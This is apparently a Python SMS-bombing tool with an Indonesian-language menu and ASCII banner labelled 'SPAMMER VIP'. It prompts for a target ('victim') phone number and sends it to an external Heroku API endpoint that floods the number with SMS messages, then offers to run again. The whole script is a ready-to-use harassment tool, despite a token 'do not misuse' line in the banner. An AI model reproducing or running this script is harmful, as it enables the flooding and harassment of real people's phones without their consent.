import requests,os,sys,time
from time import sleep
b="\033[94m"
c="\033[96m"
w="\033[37;1m"
g="\033[92m"
r="\033[91m"
p="\033[1;97m"
y=" \033[33;1m"
d="\033[00m"
ab="\033[90m"
dn=f"{d}[{c}√{d}]{p}"
er=f"{d}[{c}●{d}]{p}"
pr=f"{d}[{c}●{d}]{p}"
def clear():
    os.system("cls" if os.name == "nt" else "clear")
def baner():
    clear()
    print(f"""{g}============================================
{r}= S ░░░░░░░░░░▄▄█▀▀▄░░░░
= P ░░░░░░░░▄█████▄▄█▄░░░░
= A ░░░░░▄▄▄▀██████▄▄██░░░░
= M ░░▄██░░█░█▀░░▄▄▀█░█░░░▄▄▄▄
= M ▄█████░░██░░░▀▀░▀░█▀▀██▀▀▀█▀▄
{w}= E █████░█░░▀█░▀▀▀▀▄▀░░░███████▀
= R ░▀▀█▄░██▄▄░▀▀▀▀█▀▀▀▀▀░▀▀▀▀
=   ░▄████████▀▀▀▄▀░░░░
= V ██████░▀▀█▄░░░█▄░░░░
= I ░▀▀▀▀█▄▄▀░██████▄░░░░
= P ░░░░░░░░░█████████░░░░{g}
============================================
{r} = By   : RAMADHANI
{y}= Jan Di Salah Gunakan !
{g} = Pastikan Kartu Korban Aktif dan Tidak Di 
{b} = Mode Pesawat
{ab}{g}============================================{b}""")
def cblg():
    lg=input(f"{pr}Coba lagi? ({d}{c}y{d}/{c}n{p}) : {c}")
    if lg == "y" or lg == "Y":
       sleep(2)
       os.system("python SpamSms.py")
    elif lg == "n" or lg == "N":
       sys.exit(f"{c}Terima Kasih Telah Menggunakan Tools ini :)")
    else:
       print(f"{er}Betapa Gobloxnya Aku ")
       cblg()

def spam(nomor):
    req=requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={"phone":nomor}).text
    if "terkirim" in req:
       print(f"{dn}Spam ke {c}{nomor} berhasil")
    else:
       print(f"{er}Spam ke {c}{nomor} gagal")
if __name__=="__main__":
    baner()
    nomor=input(f"{er} Contoh Input No :{c}{p} 85812345678\n{er} Tipe Hp Anda : Kentang \n{pr} Input No Target ? :{c}")
    spam(nomor)
    cblg()